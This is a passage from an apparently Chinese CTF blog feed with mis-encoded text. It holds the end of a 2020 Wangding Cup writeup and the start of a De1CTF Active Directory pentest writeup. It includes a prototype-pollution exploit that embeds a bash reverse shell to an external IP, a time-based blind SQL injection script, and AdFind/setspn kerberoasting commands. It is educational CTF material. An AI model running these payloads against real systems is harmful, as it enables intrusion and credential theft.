-m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°æµ‹è¯•ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install undefsafe@2.0.2 -S</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510230414796.png" alt="image-20200510230414796"></p>
<p>ç„¶ååœ¨é¢˜ç›®ä¸­è¯•ï¼Œ</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510233825972.png" alt="image-20200510233825972"></p>
<p>ç„¶åè®¿é—®/status</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://503dafc6341d474b969b8cf1f00212de44c78434174f4b4d.cloudgame1.ichunqiu.com:8080/"</span></span><br><span class="line"></span><br><span class="line">re=requests.post(url+<span class="string">'edit_note'</span>,json=&#123;<span class="string">"id"</span>:<span class="string">"__proto__"</span>,<span class="string">"author"</span>:<span class="string">"bash -c \"bash -i &gt;&amp; /dev/tcp/144.34.200.151/6666 0&gt;&amp;1\""</span>,<span class="string">"raw"</span>:<span class="string">"xxx"</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br><span class="line">re=requests.get(url+<span class="string">'status'</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510233703708.png" alt="image-20200510233703708"></p>
<h1 id="0x04-trace"><a href="#0x04-trace" class="headerlink" title="0x04 trace"></a>0x04 trace</h1><p>é™åˆ¶åªèƒ½æ³¨å†Œ20ä¸ªè´¦å·ï¼Œå¯ä»¥é€šè¿‡æ—¶é—´ç›²æ³¨ï¼Œä½†æ˜¯è¿‡æ»¤äº†information.schemaï¼Œç”¨æ— åˆ—åæ³¨å…¥ï¼ŒçŒœçš„è¡¨åæ˜¯flag,åˆ©ç”¨exp()æ•´æ•°æº¢å‡ºæŠ¥é”™ï¼Œè¾¾åˆ°ä¸€ç§æ—¢ä¸ä¼šæ³¨å†Œè´¦å·ï¼ˆå‘æ•°æ®åº“æ’å…¥æ•°æ®ï¼‰ï¼Œåˆå¯ä»¥é€šè¿‡æ—¶é—´æ³¨å…¥å¾—åˆ°flagã€‚</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510234346894.png" alt="image-20200510234346894"></p>
<p>åŒç†powä¹Ÿå¯ä»¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into flag value(4,pow(if(1,sleep(3),0)+900,900));</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://0c80b72e772d418eaeb6ee0198373cbb589d6f02f80d4359.changame.ichunqiu.com/register_do.php"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">44</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload=<span class="string">r"11',exp(if(ascii(mid((select a.2 from (select 1,2 union select * from flag)a limit 1,1),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),1)+1000));-- -"</span></span><br><span class="line">		data=&#123;<span class="string">"username"</span>:payload.format(i,mid),<span class="string">"password"</span>:<span class="string">"ddd"</span>&#125;</span><br><span class="line">		print(payload.format(i,mid))</span><br><span class="line">		s_time=time.time()</span><br><span class="line">		r=requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		print(r.content)</span><br><span class="line">		e_time=time.time()</span><br><span class="line">		<span class="keyword">if</span> e_time-s_time&gt;<span class="number">3</span>:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510195425221.png" alt="image-20200510195425221"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>De1ctf Hard_Pentest_2</title>
    <url>/2020/05/09/De1ctf-pentest2/</url>
    <content><![CDATA[<p>DE1CTFé¢˜ç›®çš„ç¯å¢ƒæŒç»­å¼€äº†ä¸€å‘¨çš„æ—¶é—´ï¼Œç„¶åç”¨äº†å…­å¤©çš„æ—¶é—´æ‰å¤ç°å®Œä¸€é“é¢˜ï¼Œæ˜¯ä¸€é“æ¶‰åŠåŸŸæ¸—é€çš„é¢˜ç›®ï¼Œå’Œå‡º</p>
<p>é¢˜äººå’¨è¯¢ï¼Œå¥½åƒé¢˜ç›®ç¯å¢ƒä¹Ÿæœ‰ç‚¹é—®é¢˜ï¼ŒæŒ‰ä»–çš„writeupä¸èƒ½æˆåŠŸï¼Œç„¶åè‡ªå·±æŸ¥èµ„æ–™åï¼Œæœ€åæˆåŠŸææƒï¼Œä½†æ˜¯æœ€åä¸€</p>
<p>æ­¥æ‹¿åˆ°åŸŸæ§è¯•äº†åŠå¤©è¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚ç”±äºä¹‹å‰ä¹Ÿæ˜¯æ²¡æœ‰å­¦è¿‡åŸŸæ¸—é€è¿™æ–¹é¢ï¼Œå€Ÿç€ä»–çš„ç¯å¢ƒè¾¹å­¦ä¹ è¾¹å®è·µï¼Œå­¦åˆ°äº†å¾ˆ</p>
<p>å¤šçŸ¥è¯†ç‚¹å’Œä¸€äº›å·¥å…·çš„ä½¿ç”¨ï¼Œå¯¹åŸŸæ¸—é€ä¹Ÿæ˜¯æœ‰äº†ä¸€ç‚¹äº†è§£ï¼Œé¢˜ç›®å·§å¦™åœ°ç»“åˆäº†åŸŸæ¸—é€çš„ä¸€ç³»åˆ—çŸ¥è¯†ç‚¹ã€‚</p>
<a id="more"></a>

<ul>
<li>GPPæ¼æ´ï¼šç»„ç­–ç•¥é€‰é¡¹ï¼ˆGPPï¼‰ç»™åŸŸæˆå‘˜æ·»åŠ çš„è´¦æˆ·ä¿¡æ¯ä¼šä¿å­˜åœ¨SYSVOLæ–‡ä»¶å¤¹ä¸­ï¼Œä½¿ç”¨å¾®è½¯å…¬å¼€çš„å¯†é’¥å¯ä»¥ç›´æ¥è§£å¯†å‡ºå¯†ç ã€‚</li>
<li>kerberoastingï¼šå¦‚æœå½“å‰æ‹¥æœ‰ä¸€ä¸ªæ™®é€šçš„åŸŸç”¨æˆ·æƒé™ä¸”å¯¹ä¸€ä¸ªç”¨æˆ·æœ‰å†™å…¥spn(ServicePrincipalNames)çš„æƒé™,å°±å¯ä»¥è¿›è¡Œkerberoastingæ”»å‡»ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´å¾—åˆ°å¯¹åº”ç”¨æˆ·çš„å¯†ç ã€‚</li>
<li>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»ï¼šä¸ªäººç†è§£ï¼Œä¼ ç»Ÿçš„çº¦æŸå§”æ´¾æ˜¯é€šè¿‡msDS-AllowedToDelegateTo è®¾ç½®äº†å½“å‰å¯ä»¥å§”æ´¾çš„å¯¹è±¡ï¼Œå³æˆ‘å¯ä»¥å§”æ´¾è°ï¼›ä¸åŒäºä¼ ç»Ÿçš„çº¦æŸå§”æ´¾ï¼ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ˜¯é€šè¿‡msDS-AllowedToActOnBehalfOfOtherIdentityæ¥è®¾ç½®è°å¯ä»¥å§”æ´¾æˆ‘ã€‚ä¸ªäººè®¤ä¸ºåŸç†å°±æ˜¯ä¼ªé€ TGSã€‚</li>
<li>DCshadow:åˆ©ç”¨åŸŸæ§ä¹‹é—´çš„æ•°æ®åŒæ­¥æ¨é€ï¼Œå‘æ´»åŠ¨ç›®å½•æ•°æ®åº“ä¸­æ³¨å…¥æ¶æ„æ•°æ®å¯¹è±¡ï¼ŒåŸç†è¿˜ä¸æ˜¯å¾ˆæ‡‚,å½“æœ‰ç‰¹æ®Šçš„ä¸€äº›æ‰©å±•æƒé™å°±å¯ä»¥åˆ©ç”¨DCshadowï¼Œä¿®æ”¹primaryGroupIDå±æ€§ï¼Œå˜æˆåŸŸæ§ã€‚</li>
</ul>
<h1 id="Hard-Pentest-2"><a href="#Hard-Pentest-2" class="headerlink" title="Hard_Pentest_2"></a>Hard_Pentest_2</h1><p><img src="/2020/05/09/De1ctf-pentest2/image-20200504160434565.png" alt="image-20200504160434565"></p>
<p>æç¤ºäº†de1taçš„æƒé™ï¼Œç„¶ååˆ©ç”¨AdFind.exeæŸ¥ä¸€ä¸‹ï¼Œæ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\web -recmute</span><br><span class="line">AdFind.exe -s subtree -b &quot;cn&#x3D;de1ta,cn&#x3D;users,dc&#x3D;DE1CTF2020,dc&#x3D;lab&quot; -sc getacl -sddl++ -recmute</span><br></pre></td></tr></table></figure>

<p>å¯å¾—</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506082021322.png" alt="image-20200506082021322"></p>
<p>webç”¨æˆ·å…·æœ‰å¯¹De1taç”¨æˆ·æœ‰å†™å…¥SPNæƒé™ã€‚å…·ä½“å¯ä»¥å‚è€ƒä¸‹é¢ï¼š</p>
<blockquote>
<h3 id="2-servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1"><a href="#2-servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1" class="headerlink" title="(2)  servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)"></a><strong>(2)  servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)</strong></h3><p>å¦‚æœå¯¹ä¸€ä¸ªå¯¹è±¡æœ‰å†™å…¥spnçš„æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œkerberostingäº†ï¼Œå¦‚æœå¯†ç å¼ºåº¦ä¸å¼ºçš„è¯ï¼Œæœ‰æœºä¼šè·å–åˆ°å¯†ç ã€‚</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t013148e2dda10cec6e.png" alt="img"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/t0159a1c8ffeda51224.png" alt="img"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/t011e4510fd1f6596c9.png" alt="img"></p>
<p>æœ‰æƒé™ï¼Œå¯ä»¥è®¾ç½®spn</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t01a3ac6723857c3446.png" alt="img"></p>
<p>æŸ¥çœ‹spn</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t01710d8bd30669d01d.png" alt="img"></p>
<p>kerberoasting</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t014fc208e692a0e20e.png" alt="img"></p>
<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/12" target="_blank" rel="noopener">å‚è€ƒ</a></p>
</blockquote>
<p>ç„¶åå»è®¾ç½®spnï¼Œspnæ˜¯winè‡ªå¸¦çš„å·¥å…·ï¼Œä¸ç”¨ä¸Šä¼ ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506084714658.png" alt="image-20200506084714658"></p>
<p>åˆ©ç”¨spnè¿›è¡Œkerberoastingçš„åŸç†å¯ä»¥å‚è€ƒ<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">ä¸‹é¢</a>3gstudentå¸ˆå‚…æ–‡ç« ã€‚</p>
<blockquote>
<h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p>
<p>å…¨ç§°<code>Service Principal Names</code></p>
<p>SPNæ˜¯æœåŠ¡å™¨ä¸Šæ‰€è¿è¡ŒæœåŠ¡çš„å”¯ä¸€æ ‡è¯†ï¼Œæ¯ä¸ªä½¿ç”¨Kerberosçš„æœåŠ¡éƒ½éœ€è¦ä¸€ä¸ªSPN</p>
<p>SPNåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ³¨å†Œåœ¨ADä¸Šæœºå™¨å¸æˆ·(Computers)ä¸‹ï¼Œå¦ä¸€ç§æ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹</p>
<p>å½“ä¸€ä¸ªæœåŠ¡çš„æƒé™ä¸º<code>Local System</code>æˆ–<code>Network Service</code>ï¼Œåˆ™SPNæ³¨å†Œåœ¨æœºå™¨å¸æˆ·(Computers)ä¸‹</p>
<p>å½“ä¸€ä¸ªæœåŠ¡çš„æƒé™ä¸ºä¸€ä¸ªåŸŸç”¨æˆ·ï¼Œåˆ™SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹</p>
<h3 id="SPNçš„æ ¼å¼"><a href="#SPNçš„æ ¼å¼" class="headerlink" title="SPNçš„æ ¼å¼"></a>SPNçš„æ ¼å¼</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serviceclass&#x2F;host:port&#x2F;servicename</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ï¼š</p>
<ul>
<li>serviceclasså¯ä»¥ç†è§£ä¸ºæœåŠ¡çš„åç§°ï¼Œå¸¸è§çš„æœ‰www, ldap, SMTP, DNS, HOSTç­‰</li>
<li>hostæœ‰ä¸¤ç§å½¢å¼ï¼ŒFQDNå’ŒNetBIOSåï¼Œä¾‹å¦‚server01.test.comå’Œserver01</li>
<li>å¦‚æœæœåŠ¡è¿è¡Œåœ¨é»˜è®¤ç«¯å£ä¸Šï¼Œåˆ™ç«¯å£å·(port)å¯ä»¥çœç•¥</li>
</ul>
<h3 id="æŸ¥è¯¢SPN"><a href="#æŸ¥è¯¢SPN" class="headerlink" title="æŸ¥è¯¢SPN"></a>æŸ¥è¯¢SPN</h3><p>å¯¹åŸŸæ§åˆ¶å™¨å‘èµ·LDAPæŸ¥è¯¢ï¼Œè¿™æ˜¯æ­£å¸¸kerberosç¥¨æ®è¡Œä¸ºçš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤æŸ¥è¯¢SPNçš„æ“ä½œå¾ˆéš¾è¢«æ£€æµ‹</p>
<h4 id="1-ä½¿ç”¨SetSPN"><a href="#1-ä½¿ç”¨SetSPN" class="headerlink" title="(1) ä½¿ç”¨SetSPN"></a>(1) ä½¿ç”¨SetSPN</h4><p>Win7å’ŒWindows Server2008è‡ªå¸¦çš„å·¥å…·</p>
<p>æŸ¥çœ‹å½“å‰åŸŸå†…çš„æ‰€æœ‰SPNï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -q *&#x2F;*</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹teståŸŸå†…çš„æ‰€æœ‰SPNï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -T test -q *&#x2F;*</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœå®ä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CN&#x3D;DC1,OU&#x3D;Domain Controllers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        exchangeRFR&#x2F;DC1</span><br><span class="line">        exchangeRFR&#x2F;DC1.test.com</span><br><span class="line">        exchangeMDB&#x2F;DC1.test.com</span><br><span class="line">        exchangeMDB&#x2F;DC1</span><br><span class="line">        exchangeAB&#x2F;DC1</span><br><span class="line">        exchangeAB&#x2F;DC1.test.com</span><br><span class="line">        SMTP&#x2F;DC1</span><br><span class="line">        SMTP&#x2F;DC1.test.com</span><br><span class="line">        SmtpSvc&#x2F;DC1</span><br><span class="line">        SmtpSvc&#x2F;DC1.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;ForestDnsZones.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;DomainDnsZones.test.com</span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;DC1.test.com</span><br><span class="line">        DNS&#x2F;DC1.test.com</span><br><span class="line">        GC&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">        RestrictedKrbHost&#x2F;DC1.test.com</span><br><span class="line">        RestrictedKrbHost&#x2F;DC1</span><br><span class="line">        HOST&#x2F;DC1&#x2F;TEST</span><br><span class="line">        HOST&#x2F;DC1.test.com&#x2F;TEST</span><br><span class="line">        HOST&#x2F;DC1</span><br><span class="line">        HOST&#x2F;DC1.test.com</span><br><span class="line">        HOST&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;0f33253b-2314-40f0-b665-f4317b13e6b9&#x2F;test.com</span><br><span class="line">        ldap&#x2F;DC1&#x2F;TEST</span><br><span class="line">        ldap&#x2F;0f33253b-2314-40f0-b665-f4317b13e6b9._msdcs.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;TEST</span><br><span class="line">        ldap&#x2F;DC1</span><br><span class="line">        ldap&#x2F;DC1.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        kadmin&#x2F;changepw</span><br><span class="line">CN&#x3D;COMPUTER01,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        RestrictedKrbHost&#x2F;COMPUTER01</span><br><span class="line">        HOST&#x2F;COMPUTER01</span><br><span class="line">        RestrictedKrbHost&#x2F;COMPUTER01.test.com</span><br><span class="line">        HOST&#x2F;COMPUTER01.test.com</span><br><span class="line">CN&#x3D;MSSQL Service Admin,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        MSSQLSvc&#x2F;DC1.test.com</span><br></pre></td></tr></table></figure>

<p>ä»¥CNå¼€å¤´çš„æ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªå¸æˆ·ï¼Œå…¶ä¸‹çš„ä¿¡æ¯æ˜¯ä¸è¯¥å¸æˆ·ç›¸å…³è”çš„SPN</p>
<p>å¯¹äºä¸Šé¢çš„è¾“å‡ºæ•°æ®ï¼Œæœºå™¨å¸æˆ·(Computers)ä¸ºï¼š</p>
<ul>
<li>CN=DC1,OU=Domain Controllers,DC=test,DC=com</li>
<li>CN=COMPUTER01,CN=Computers,DC=test,DC=com</li>
</ul>
<p>åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸ºï¼š</p>
<ul>
<li>CN=krbtgt,CN=Users,DC=test,DC=com</li>
<li>CN=MSSQL Service Admin,CN=Users,DC=test,DC=com</li>
</ul>
<p>æ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹çš„SPNæœ‰ä¸¤ä¸ªï¼š<code>kadmin/changepw</code>å’Œ<code>MSSQLSvc/DC1.test.com</code></p>
<h2 id="0x03-Kerberoastingçš„åŸç†"><a href="#0x03-Kerberoastingçš„åŸç†" class="headerlink" title="0x03 Kerberoastingçš„åŸç†"></a>0x03 Kerberoastingçš„åŸç†</h2><hr>
<h4 id="1ã€Kerberosè®¤è¯è¿‡ç¨‹"><a href="#1ã€Kerberosè®¤è¯è¿‡ç¨‹" class="headerlink" title="1ã€Kerberosè®¤è¯è¿‡ç¨‹"></a>1ã€Kerberosè®¤è¯è¿‡ç¨‹</h4><p>ä¸€ä¸ªç®€å•çš„Kerberosè®¤è¯è¿‡ç¨‹å¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-1.png" alt="Alt text"></p>
<ol>
<li>as_request</li>
<li>as_reply</li>
<li>tgs_request</li>
<li>tgs_reply</li>
<li>ap_request</li>
<li>ap_reply</li>
</ol>
<p>å¯¹äº4.tgs_replyï¼Œç”¨æˆ·å°†ä¼šæ”¶åˆ°ç”±ç›®æ ‡æœåŠ¡å®ä¾‹çš„NTLM hashåŠ å¯†ç”Ÿæˆçš„TGS(service ticket)ï¼ŒåŠ å¯†ç®—æ³•ä¸º<code>RC4-HMAC</code></p>
<p>ç«™åœ¨åˆ©ç”¨çš„è§’åº¦ï¼Œå½“è·å¾—è¿™ä¸ªTGSåï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç©·ä¸¾å£ä»¤ï¼Œæ¨¡æ‹ŸåŠ å¯†è¿‡ç¨‹ï¼Œç”ŸæˆTGSè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœTGSç›¸åŒï¼Œä»£è¡¨å£ä»¤æ­£ç¡®ï¼Œå°±èƒ½è·å¾—ç›®æ ‡æœåŠ¡å®ä¾‹çš„æ˜æ–‡å£ä»¤</p>
<h4 id="2ã€Windowsç³»ç»Ÿé€šè¿‡SPNæŸ¥è¯¢è·å¾—æœåŠ¡å’ŒæœåŠ¡å®ä¾‹å¸æˆ·çš„å¯¹åº”å…³ç³»"><a href="#2ã€Windowsç³»ç»Ÿé€šè¿‡SPNæŸ¥è¯¢è·å¾—æœåŠ¡å’ŒæœåŠ¡å®ä¾‹å¸æˆ·çš„å¯¹åº”å…³ç³»" class="headerlink" title="2ã€Windowsç³»ç»Ÿé€šè¿‡SPNæŸ¥è¯¢è·å¾—æœåŠ¡å’ŒæœåŠ¡å®ä¾‹å¸æˆ·çš„å¯¹åº”å…³ç³»"></a>2ã€Windowsç³»ç»Ÿé€šè¿‡SPNæŸ¥è¯¢è·å¾—æœåŠ¡å’ŒæœåŠ¡å®ä¾‹å¸æˆ·çš„å¯¹åº”å…³ç³»</h4><p>è¿™é‡Œä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p>
<p>ç”¨æˆ·aè¦è®¿é—®MySQLæœåŠ¡çš„èµ„æºï¼Œè¿›è¡Œåˆ°4.tgs_replyæ—¶ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<p>(1)Domain ControlleræŸ¥è¯¢MySQLæœåŠ¡çš„SPN</p>
<p>å¦‚æœè¯¥SPNæ³¨å†Œåœ¨æœºå™¨å¸æˆ·(Computers)ä¸‹ï¼Œå°†ä¼šæŸ¥è¯¢æ‰€æœ‰æœºå™¨å¸æˆ·(Computers)çš„servicePrincipalNameå±æ€§ï¼Œæ‰¾åˆ°å¯¹åº”çš„å¸æˆ·</p>
<p>å¦‚æœè¯¥SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹ï¼Œå°†ä¼šæŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·(Users)çš„servicePrincipalNameå±æ€§ï¼Œæ‰¾åˆ°å¯¹åº”çš„å¸æˆ·</p>
<p>(2)æ‰¾åˆ°å¯¹åº”çš„å¸æˆ·åï¼Œä½¿ç”¨è¯¥å¸æˆ·çš„NTLM hashï¼Œç”ŸæˆTGS</p>
<h4 id="3ã€åŸŸå†…çš„ä¸»æœºéƒ½èƒ½æŸ¥è¯¢SPN"><a href="#3ã€åŸŸå†…çš„ä¸»æœºéƒ½èƒ½æŸ¥è¯¢SPN" class="headerlink" title="3ã€åŸŸå†…çš„ä¸»æœºéƒ½èƒ½æŸ¥è¯¢SPN"></a>3ã€åŸŸå†…çš„ä¸»æœºéƒ½èƒ½æŸ¥è¯¢SPN</h4><h4 id="4ã€åŸŸå†…çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å‘åŸŸå†…çš„ä»»ä½•æœåŠ¡è¯·æ±‚TGS"><a href="#4ã€åŸŸå†…çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å‘åŸŸå†…çš„ä»»ä½•æœåŠ¡è¯·æ±‚TGS" class="headerlink" title="4ã€åŸŸå†…çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å‘åŸŸå†…çš„ä»»ä½•æœåŠ¡è¯·æ±‚TGS"></a>4ã€åŸŸå†…çš„ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥å‘åŸŸå†…çš„ä»»ä½•æœåŠ¡è¯·æ±‚TGS</h4><p>ç»¼ä¸Šï¼ŒåŸŸå†…çš„ä»»ä½•ä¸€å°ä¸»æœºï¼Œéƒ½èƒ½å¤Ÿé€šè¿‡æŸ¥è¯¢SPNï¼Œå‘åŸŸå†…çš„æ‰€æœ‰æœåŠ¡è¯·æ±‚TGSï¼Œæ‹¿åˆ°TGSåå¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£</p>
<p>å¯¹äºç ´è§£å‡ºçš„æ˜æ–‡å£ä»¤ï¼Œåªæœ‰åŸŸç”¨æˆ·å¸æˆ·(Users)çš„å£ä»¤å­˜åœ¨ä»·å€¼ï¼Œä¸å¿…è€ƒè™‘æœºå™¨å¸æˆ·çš„å£ä»¤(æ— æ³•ç”¨äºè¿œç¨‹è¿æ¥)</p>
<p>å› æ­¤ï¼Œé«˜æ•ˆç‡çš„åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p>
<ol>
<li>æŸ¥è¯¢SPNï¼Œæ‰¾åˆ°æœ‰ä»·å€¼çš„SPNï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š<ul>
<li>è¯¥SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹</li>
<li>åŸŸç”¨æˆ·è´¦æˆ·çš„æƒé™å¾ˆé«˜</li>
</ul>
</li>
<li>è¯·æ±‚TGS</li>
<li>å¯¼å‡ºTGS</li>
<li>æš´åŠ›ç ´è§£</li>
</ol>
<h2 id="0x04-Kerberoastingçš„å®ç°æ–¹æ³•ä¸€"><a href="#0x04-Kerberoastingçš„å®ç°æ–¹æ³•ä¸€" class="headerlink" title="0x04 Kerberoastingçš„å®ç°æ–¹æ³•ä¸€"></a>0x04 Kerberoastingçš„å®ç°æ–¹æ³•ä¸€</h2><hr>
<h3 id="1ã€è·å¾—æœ‰ä»·å€¼çš„SPN"><a href="#1ã€è·å¾—æœ‰ä»·å€¼çš„SPN" class="headerlink" title="1ã€è·å¾—æœ‰ä»·å€¼çš„SPN"></a>1ã€è·å¾—æœ‰ä»·å€¼çš„SPN</h3><p>éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>è¯¥SPNæ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹</li>
<li>åŸŸç”¨æˆ·è´¦æˆ·çš„æƒé™å¾ˆé«˜</li>
</ul>
<p>å¯ä»¥é€‰æ‹©ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼š</p>
